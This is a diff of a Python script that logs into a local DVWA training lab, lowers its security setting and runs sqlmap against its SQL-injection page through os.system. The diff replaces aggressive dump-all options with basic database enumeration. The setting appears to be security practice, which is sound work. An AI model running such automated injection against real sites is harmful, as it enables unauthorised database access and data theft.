@@ -6,12 +6,13 @@ from bs4 import BeautifulSoup
 base_url = "http://192.168.64.3/DVWA/"
 login_url = base_url + "login.php"
 sqli_url = base_url + "vulnerabilities/sqli/?id=1&Submit=Submit"
+security_url = base_url + "security.php"
 
 # DVWA login credentials
 dvwa_username = "admin"
 dvwa_password = "password"
 
-# Function to login to DVWA and retrieve session ID and cookies
+# Function to login to DVWA and retrieve session cookies
 def get_session_cookies():
     with requests.Session() as session:
         # Get initial login page to retrieve the user_token
@@ -34,6 +35,16 @@ def get_session_cookies():
         if "Welcome to Damn Vulnerable Web Application" in post_response.text:
             print("Login successful.")
             cookies = session.cookies.get_dict()
+            
+            # Set security level to low
+            security_payload = {
+                'security': 'low',
+                'seclev_submit': 'Submit'
+            }
+            session.post(security_url, data=security_payload)
+            
+            # Return updated cookies
+            cookies = session.cookies.get_dict()
             return cookies
         else:
             print("Login failed. Check your credentials and DVWA configuration.")
@@ -44,13 +55,12 @@ def run_sqlmap(target_url, cookies):
     if cookies:
         # Prepare cookies string for SQLMap
         cookie_string = "; ".join([f"{key}={value}" for key, value in cookies.items()])
-        cookie_string += "; security=low"  # Add security level
         
-        # More aggressive SQLMap options for full-fledged SQL injection testing
+        # Basic SQLMap options for simple SQL injection testing
         sqlmap_command = (
             f"sqlmap -u \"{target_url}\" "
             f"--cookie=\"{cookie_string}\" "
-            "--batch --level=5 --risk=3 --dbs --tables --columns --dump-all --random-agent --threads=5"
+            "--batch --level=1 --risk=1 --dbs"
         )
         print(f"Running SQLMap with command: {sqlmap_command}")
         os.system(sqlmap_command)
